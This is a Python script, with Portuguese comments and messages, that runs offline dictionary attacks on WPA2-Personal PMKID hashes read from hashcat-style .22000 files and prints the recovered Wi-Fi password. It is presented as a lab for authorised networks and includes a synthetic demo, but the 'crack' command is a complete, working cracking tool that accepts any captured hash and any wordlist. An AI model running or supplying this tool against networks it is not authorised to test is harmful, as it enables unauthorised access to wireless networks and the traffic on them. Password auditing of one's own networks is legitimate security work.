#!/usr/bin/env python3
"""Laboratório offline de senhas WPA2-Personal com PMKID; Python padrão."""

from __future__ import annotations

import argparse
import hashlib
import hmac
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Iterable


@dataclass(frozen=True)
class Record:
    pmkid: bytes
    ap: bytes
    station: bytes
    ssid: bytes


@dataclass(frozen=True)
class Result:
    record: Record | None
    password: str | None
    tested: int
    skipped: int


def derive_pmk(password: str, ssid: bytes) -> bytes:
    raw = password.encode("ascii")
    if not 8 <= len(raw) <= 63 or any(c < 32 or c > 126 for c in raw):
        raise ValueError("a frase-senha deve ter de 8 a 63 caracteres ASCII imprimíveis")
    if not 1 <= len(ssid) <= 32:
        raise ValueError("o SSID deve ter de 1 a 32 bytes")
    return hashlib.pbkdf2_hmac("sha1", raw, ssid, 4096, 32)


def calculate_pmkid(pmk: bytes, ap: bytes, station: bytes) -> bytes:
    if len(pmk) != 32 or len(ap) != 6 or len(station) != 6:
        raise ValueError("tamanho inválido de chave ou endereço MAC")
    return hmac.new(pmk, b"PMK Name" + ap + station, hashlib.sha1).digest()[:16]


def hex_bytes(value: str, label: str, size: int | None = None) -> bytes:
    if not value or len(value) % 2 or any(c not in "0123456789abcdefABCDEF" for c in value):
        raise ValueError(f"{label}: hexadecimal inválido")
    decoded = bytes.fromhex(value)
    if size is not None and len(decoded) != size:
        raise ValueError(f"{label}: esperado(s) {size} byte(s)")
    return decoded


def parse_record(line: str) -> Record:
    fields = line.split("*")
    if fields[:2] == ["WPA", "02"]:
        raise ValueError("registro EAPOL (WPA*02) não suportado; forneça um PMKID WPA*01")
    if len(fields) != 9 or fields[:2] != ["WPA", "01"] or any(fields[6:]):
        raise ValueError("formato esperado: WPA*01*PMKID*MAC_AP*MAC_CLIENTE*SSID_HEX***")
    pmkid = hex_bytes(fields[2], "PMKID", 16)
    if pmkid == bytes(16):
        raise ValueError("PMKID composto apenas por zeros")
    ap = hex_bytes(fields[3], "MAC do AP", 6)
    station = hex_bytes(fields[4], "MAC do cliente", 6)
    ssid = hex_bytes(fields[5], "SSID")
    if not 1 <= len(ssid) <= 32:
        raise ValueError("o SSID deve ter de 1 a 32 bytes")
    return Record(pmkid, ap, station, ssid)


def load_records(path: Path, ssid_filter: str | None = None) -> list[Record]:
    records = []
    for number, line in enumerate(path.read_text(encoding="ascii").splitlines(), 1):
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        try:
            record = parse_record(line)
        except ValueError as exc:
            raise ValueError(f"linha {number}: {exc}") from exc
        if ssid_filter is None or record.ssid == ssid_filter.encode("utf-8"):
            if record not in records:
                records.append(record)
    if not records:
        raise ValueError("nenhum registro PMKID encontrado para o filtro informado")
    return records


def wordlist_lines(path: Path) -> Iterable[bytes]:
    with path.open("rb") as stream:
        for line in stream:
            # Preserva espaços na senha; remove somente o terminador da linha.
            yield line.rstrip(b"\r\n")


def crack(records: list[Record], candidates: Iterable[bytes]) -> Result:
    if not records:
        raise ValueError("é necessário ao menos um registro")
    tested = skipped = 0
    for raw in candidates:
        if not 8 <= len(raw) <= 63 or any(c < 32 or c > 126 for c in raw):
            skipped += 1
            continue
        password = raw.decode("ascii")
        tested += 1
        # Um PBKDF2 por SSID e candidato, mesmo com múltiplos registros da rede.
        keys: dict[bytes, bytes] = {}
        for record in records:
            if record.ssid not in keys:
                keys[record.ssid] = derive_pmk(password, record.ssid)
            actual = calculate_pmkid(keys[record.ssid], record.ap, record.station)
            if hmac.compare_digest(actual, record.pmkid):
                return Result(record, password, tested, skipped)
    return Result(None, None, tested, skipped)


def report(result: Result, elapsed: float) -> int:
    print(f"Candidatos testados: {result.tested}; linhas ignoradas: {result.skipped}.")
    print(f"Tempo: {elapsed:.3f} s.")
    if result.record is None:
        print("Nenhuma correspondência. Isso não comprova que a senha seja forte.")
        return 1
    ssid = result.record.ssid.decode("utf-8", errors="backslashreplace")
    # repr impede que nomes de rede com controles alterem o terminal.
    print(f"Correspondência para o SSID: {ssid!r}")
    print(f"Senha encontrada: {result.password!r}")
    return 0


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description="Teste de dicionário offline de PMKID WPA2-Personal em redes autorizadas."
    )
    subparsers = parser.add_subparsers(dest="command", required=True)
    subparsers.add_parser("demo", help="executa um exemplo sintético, sem usar a rede")
    search = subparsers.add_parser("crack", help="testa uma lista local contra PMKID(s)")
    search.add_argument("capture", type=Path, help="arquivo de texto .22000 com registros WPA*01")
    search.add_argument("wordlist", type=Path, help="arquivo local: uma senha por linha")
    search.add_argument("--ssid", help="filtra o SSID pelo nome UTF-8 exato")
    args = parser.parse_args(argv)
    try:
        if args.command == "demo":
            examples = Path(__file__).resolve().parent / "examples"
            records = load_records(examples / "aula.22000")
            words = wordlist_lines(examples / "senhas.txt")
            print("Demonstração sintética: rede fictícia Aula-WiFi, senha conhecida Aula2026!.")
        else:
            records = load_records(args.capture, args.ssid)
            words = wordlist_lines(args.wordlist)
        print(f"Registros carregados: {len(records)}. A busca termina na primeira correspondência.")
        started = time.perf_counter()
        result = crack(records, words)
        return report(result, time.perf_counter() - started)
    except (OSError, ValueError) as exc:
        print(f"Erro: {exc}", file=sys.stderr)
        return 2
    except KeyboardInterrupt:
        print("\nTeste interrompido.", file=sys.stderr)
        return 130


if __name__ == "__main__":
    sys.exit(main())
